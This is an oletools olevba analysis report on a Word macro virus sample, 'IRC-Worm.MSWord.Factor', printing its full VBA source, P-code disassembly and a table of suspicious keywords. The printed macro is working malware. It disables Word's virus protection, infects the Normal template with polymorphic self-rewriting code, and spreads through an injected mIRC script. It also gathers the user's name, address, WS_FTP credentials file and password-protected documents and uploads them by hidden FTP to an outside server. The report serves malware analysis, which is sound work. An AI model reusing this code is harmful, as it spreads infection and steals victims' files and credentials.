olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: IRC-Worm.MSWord.Factor
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: IRC-Worm.MSWord.Factor - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = wdDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
LordArz = "Technological Illusions"
NormInstalled = False
ActInstalled = False
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True

If NormInstalled = False Then
    Set Infection = NormCarrier
    Set Carrier = ActCarrier
Else
    Set Infection = ActCarrier
    Set Carrier = NormCarrier
End If



DoEvents

Rem -------------------BEGIN WORM------------------------------------->
Close
Tr1 = Dir(CurDir & "\script.ini", vbNormal)
Tr2 = UCase(Right(CurDir, 8))
Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)

If Tr1 <> "" Then SDir = CurDir & "\script.ini"
If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"

If SDir <> "" Then
    Open SDir For Output As #1
    Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
    Close #1
End If
Rem ----------------------------END WORM------------------------------>
DoEvents
Rem ----------------------------BEGIN PAYLOAD------------------------->

WinPath = Environ("WINDIR")

If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date) Then
    With Application.FileSearch
            .FileName = "WS_FTP.ini"
            .LookIn = "C" & Chr(58) & "\"
            .SearchSubFolders = True
            .MatchTextExactly = True
            .FileType = msoFileTypeAllFiles
            .Execute
            WsPath = .FoundFiles(1)
    End With
       
    DoEvents
    
    If ActiveDocument.HasPassword = True Then BCK = True
    
    DoEvents
    Open WinPath & "\" & Application.UserInitials & ".dat" For Output As #10
    Print #10, Application.UserName
    Print #10, Application.UserAddress
    If BCK = True Then Print #10, ActiveDocument.FullName
    If WsPath <> "" Then Print #10, "WS_FTP"
    Close #10
    Open WinPath & "\Command.$$$" For Output As #8
    Print #8, "o ftp.xoom.com"
    Print #8, "User SingOfScream"
    Print #8, "DIG001"
    Print #8, "binary"
    Print #8, "put " & WinPath & "\" & Application.UserInitials & ".dat"
    If WsPath <> "" Then Print #8, "put " & WsPath
    If BCK = True Then Print #8, "put " & ActiveDocument.FullName
        Print #8, "quit"
    Close
    Shell WinPath & "\command.com /c FTP.exe -n -s:" & WinPath & "\Command.$$$", vbHide
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date)
End If
Rem ------------------------------END OF PAYLOAD---------------------->

For x = 1 To ThisDocument.Variables.Count
    ThisDocument.Variables(x).Delete
Next x
For x = 1 To Normal.ThisDocument.Variables.Count
    Normal.ThisDocument.Variables(x).Delete
Next x

With Carrier
    UECode = .Lines(1, 2) & Chr(13)
    For x = 5 To .CountOfLines - 1
        VCCode = .Lines(x, 1)
        If VCCode = "End Sub" Then Exit For
        For i = 1 To 20
            If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
        Next i
        factor = ""
        For Y = 1 To Int(Rnd * 6) + 6
            factor = factor & Chr(Int(Rnd * 25) + 65)
        Next Y
        make_morph = factor & ": "

        VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
        If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & Chr(58) & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(58) & Chr(13)
    Next x
    VirCode = UECode & VirCode & "End Sub"
End With

Normal.ThisDocument.Variables.Add "VCode", VirCode

ResetMe = "Private Sub Document_Close()" & Chr(13)
ResetMe = ResetMe & String(150, Chr(9)) & "If ShowVisualBasicEditor=True Then Exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
ResetMe = ResetMe & "End Sub"

With ActCarrier
        .DeleteLines 1, .CountOfLines
        .InsertLines 1, ResetMe
End With

With NormCarrier
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe
End With

ActiveDocument.Save
NormalTemplate.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: IRC-Worm.MSWord.Factor
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8385 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #6:
' 	LitStr 0x0017 "Technological Illusions"
' 	St LordArz 
' Line #7:
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #8:
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ActCarrier 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NormCarrier 
' Line #11:
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NI 
' Line #13:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St AI 
' Line #14:
' Line #15:
' 	Ld NI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #16:
' 	Ld AI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #17:
' Line #18:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Infection 
' Line #20:
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Carrier 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Infection 
' Line #23:
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Carrier 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' 	ArgsCall DoEvents 0x0000 
' Line #29:
' Line #30:
' 	Rem 0x0044 " -------------------BEGIN WORM------------------------------------->"
' Line #31:
' 	CloseAll 
' Line #32:
' 	Ld CurDir 
' 	LitStr 0x000B "\script.ini"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	St Tr1 
' Line #33:
' 	Ld CurDir 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Tr2 
' Line #34:
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "\MIRC"
' 	Concat 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St Tr3 
' Line #35:
' Line #36:
' 	Ld Tr1 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000B "\script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #37:
' 	Ld Tr2 
' 	LitStr 0x0008 "DOWNLOAD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000E "\..\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #38:
' 	Ld Tr3 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "\MIRC\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #39:
' Line #40:
' 	Ld SDir 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld SDir 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "n0=on 1"
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 "JOIN"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "#"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "if ( $me != $nick ) { /dcc send $nick "
' 	Concat 
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0002 " }"
' 	Concat 
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Rem 0x0044 " ----------------------------END WORM------------------------------>"
' Line #46:
' 	ArgsCall DoEvents 0x0000 
' Line #47:
' 	Rem 0x0044 " ----------------------------BEGIN PAYLOAD------------------------->"
' Line #48:
' Line #49:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St WinPath 
' Line #50:
' Line #51:
' 	LitStr 0x000E "Sockets Window"
' 	Ld Application 
' 	MemLd Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #52:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #53:
' 	LitStr 0x000A "WS_FTP.ini"
' 	MemStWith FileName 
' Line #54:
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	MemStWith LookIn 
' Line #55:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #56:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #57:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #58:
' 	ArgsMemCallWith Execute 0x0000 
' Line #59:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St WsPath 
' Line #60:
' 	EndWith 
' Line #61:
' Line #62:
' 	ArgsCall DoEvents 0x0000 
' Line #63:
' Line #64:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St BCK 
' 	EndIf 
' Line #65:
' Line #66:
' 	ArgsCall DoEvents 0x0000 
' Line #67:
' 	Ld WinPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	LitDI2 0x000A 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #68:
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserName 
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserAddress 
' 	PrintItemNL 
' Line #70:
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	PrintItemNL 
' 	EndIf 
' Line #71:
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "WS_FTP"
' 	PrintItemNL 
' 	EndIf 
' Line #72:
' 	LitDI2 0x000A 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	Ld WinPath 
' 	LitStr 0x000C "\Command.$$$"
' 	Concat 
' 	LitDI2 0x0008 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #74:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "o ftp.xoom.com"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "User SingOfScream"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "DIG001"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld WinPath 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	PrintItemNL 
' Line #79:
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld WsPath 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #80:
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #81:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #82:
' 	CloseAll 
' Line #83:
' 	Ld WinPath 
' 	LitStr 0x001E "\command.com /c FTP.exe -n -s:"
' 	Concat 
' 	Ld WinPath 
' 	Concat 
' 	LitStr 0x000C "\Command.$$$"
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #84:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Rem 0x0044 " ------------------------------END OF PAYLOAD---------------------->"
' Line #87:
' Line #88:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #89:
' 	Ld x 
' 	Ld ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #90:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #92:
' 	Ld x 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #93:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #94:
' Line #95:
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' Line #96:
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode 
' Line #97:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #98:
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VCCode 
' Line #99:
' 	Ld VCCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #101:
' 	Ld VCCode 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VCCode 
' 	Ld VCCode 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St VCCode 
' 	EndIf 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	LitStr 0x0000 ""
' 	St factor 
' Line #104:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Add 
' 	For 
' Line #105:
' 	Ld factor 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St factor 
' Line #106:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld factor 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	St make_morph 
' Line #108:
' Line #109:
' 	Ld VirCode 
' 	Ld make_morph 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld VCCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' Line #110:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VirCode 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' 	EndIf 
' Line #111:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	Ld UECode 
' 	Ld VirCode 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St VirCode 
' Line #113:
' 	EndWith 
' Line #114:
' Line #115:
' 	LitStr 0x0005 "VCode"
' 	Ld VirCode 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #116:
' Line #117:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #118:
' 	Ld ResetMe 
' 	LitDI2 0x0096 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x00D7 "If ShowVisualBasicEditor=True Then Exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #119:
' 	Ld ResetMe 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St ResetMe 
' Line #120:
' Line #121:
' 	StartWithExpr 
' 	Ld ActCarrier 
' 	With 
' Line #122:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #123:
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #124:
' 	EndWith 
' Line #125:
' Line #126:
' 	StartWithExpr 
' 	Ld NormCarrier 
' 	With 
' Line #127:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #128:
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #129:
' 	EndWith 
' Line #130:
' Line #131:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #132:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #133:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

